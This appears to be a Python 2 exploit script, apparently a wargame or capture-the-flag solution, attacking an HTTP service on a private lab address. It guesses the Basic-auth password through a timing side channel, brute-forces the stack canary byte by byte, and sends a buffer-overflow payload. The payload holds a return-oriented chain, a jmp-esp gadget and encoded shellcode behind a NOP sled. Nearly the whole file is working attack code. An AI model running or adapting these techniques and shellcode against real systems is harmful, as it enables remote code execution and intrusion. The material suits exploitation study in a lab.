from pwn_expoit import *
from base64 import *
from socket import *
import time
password = "33QPrkMK0H0sd00t"
pwd = ['1','2','3','4','5','6','7','8','9','0','Q','W','E','R','T','Y','U','I','O','P','A','S','D','F','G','H','J','K','L','Z','X','C','V','B','N','M','q','w','e','r','t','y','u','i','o','p','a','s','d','f','g','h','j','k','l','z','x','c','v','b','n','m']
def keycrack(pwd):
    res = ""
    first = 0
    for k in range(0,16):
        t_t = []
        for i in range(0,len(pwd)):
                s = socket(AF_INET,SOCK_STREAM)
                s.connect(("192.168.224.129",20004))
                s.send("get / protocol\r\n")
                key = res+pwd[i]
                key = base64.encodestring(key)
                s.send("Authorization: Basic "+key+"\r\n")
                s.send("\r\n")
                t1 = time.time()
                s.recv(1000)
                t2 = time.time()
                t_t.append(t2-t1)
                s.close()
        for j in range(0,len(t_t)):
            if t_t[0]>t_t[j]:
                t_t[0] = t_t[j]
                first = j
        res += pwd[first]
        print "key : "+res+"      time"+"  %s"%str(t_t[first])
    return res
        
print "----------------------------------"
print "----------------------------------"
ins = 0
 
#crack
#res = keycrack(pwd)
 
#Dummy size check
"""
while True:
    time.sleep(0.5)
    s = socket(AF_INET,SOCK_STREAM)
    s.connect(("192.168.224.129",20004))
    s.send("get / pwnpwn\r\n")
    password = base64.b64encode(password+"A"*(2000+ins))
    s.send("Authorization: Basic "+password+"\r\n")
    s.send("\r\n")
    check = s.recv(1024)
    if "smashing" in check:
        print check
        print "detail size !!\nHEX : "+hex(1999+ins)+"byte\n"+"DEC : "+str(1999+ins)
        break
    ins += 1
    s.close()
#brute canary
tmp = ""
for j in range(0,4):
    for i in range(0x0,0xff):
        s = socket(AF_INET,SOCK_STREAM)
        s.connect(("192.168.224.129",20004))
        s.send("get / pwnpwn \r\n")
        dat  = ""
        dat += res
        dat += 'A'*(1999+ins)
        dat += tmp
        dat += chr(i)
        s.send("Authorization: Basic "+base64.b64encode(dat)+"\r\n")
        s.send('\r\n')
        if "smashing" in s.recv(1024):
            continue
        else:
            print hex(i)
            tmp += chr(i)
            break;
        s.close()
#tmp = u32(tmp)
#print hex(tmp)
s = remote("192.168.224.129",20004)
s.send("get / kk \r\n")
s.send("Authorization: Basic "+base64.b64encode(password+'A'*2033)+"\r\n")
while True:
    k = s.recv(1024)
    if "[stack]" in k:
        print k
        break
"""
canary = p32(0xc48f3b00)
#################################################
binary_base = 0xb78d1000
ppppr = 0x2d9c
read_plt = 0xd20
write_plt = 0xf30
write_got = 0xa8
stack = 0xbfb1f000
"""
tmp = ""
for j in range(0,4):
    for i in range(0,0xff):
        dat  = ""
        dat += password
        dat += 'a'*(2032)
        dat += canary
        dat += "A"*12
        dat += tmp
        dat += chr(i)
        s= socket(AF_INET,SOCK_STREAM)
                s.connect(("192.168.224.129",20004))
                s.send("get / pwnpwn \r\n")
        s.send("Authorization: Basic "+base64.b64encode(dat)+"\r\n")
        s.send("\n\r")
        try:
            check = s.recv(1024)
        except:
            check = ""
        if "HTTP/1.0 200 Ok" in check:
            tmp += chr(i)
            print tmp
            s.close()
            break
        s.close()
print str(tmp)
tmp = u32(tmp)
"""
sc = "\x90"*100+\
"\xd9\xc0\xd9\x74\x24\xf4\x5b\x33\xc9\xbe\x63\x55\xd6\xf9" +\
"\xb1\x12\x83\xeb\xfc\x31\x73\x16\x03\x73\x16\xe2\x96\x64" +\
"\x0d\x0e\xbb\xd4\xf2\xa2\x51\xd9\x7d\xa5\x15\xbb\xb0\xa6" +\
"\x0e\x1a\x23\x67\x18\x42\x22\x01\x30\x87\x97\xa8\x93\xed" +\
"\x07\x64\x43\x7b\xc6\xc5\x09\x1d\x51\x07\x4d\xb8\xe6\x4e" +\
"\xfd\x04\x24\xf0\xb4\x03\x4f\xa1\x2e\xdb\x80\x31\xc6\x4b" +\
"\xf0\xd7\x7f\xe2\x87\xfb\x2f\xa9\x1e\x1a\x7f\x46\xec\x5d"
 
ebx = 0xb78d5118
#print "EBX : "+hex(ebx)
add_ebx = 0x1798
jmp_esp = 0x3787
for i in range(0,20):
    dat  = ""
    dat += password
    dat += 'A'*2032
    dat += canary
    dat += p32(0xdeadbeef)*3
    dat += p32(ebx)
    dat += p32(0xAAAAAAAA)*3
    """
    dat += p32(binary_base+read_plt)
    dat += p32(binary_base+ppppr+1)
    dat += p32(0x0)
    dat += p32(stack)
    dat += p32(len(sc))
    """
    dat += p32(0xb77f6690)
    dat += p32(binary_base+ppppr+1)
    dat += p32(stack)
    dat += p32(0x10000)
    dat += p32(0x7)
    
    dat += p32(binary_base+0x3787)
    dat += sc
    offset = 0x5480
    s = remote("192.168.224.129",20004)
    s.send("get / payload\r\n")
    s.send("Authorization: Basic "+base64.b64encode(dat)+"\r\n")
    s.send("\r\n")

